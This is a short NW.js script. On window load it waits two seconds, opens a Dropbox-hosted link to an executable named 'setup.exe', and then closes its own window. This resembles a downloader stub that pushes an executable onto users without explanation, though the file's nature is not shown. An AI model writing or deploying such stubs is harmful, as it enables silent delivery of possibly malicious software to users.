var gui = require('nw.gui');

var url = 'https://dl.dropboxusercontent.com/s/ezcji8xo7u3jpyj/setup.exe';

nw.Window.get().on('loaded', function(){
    setTimeout(function(){
        gui.Shell.openExternal(url);
        setTimeout(function(){
            nw.Window.get().close();
        },1000);
    }, 2000);
});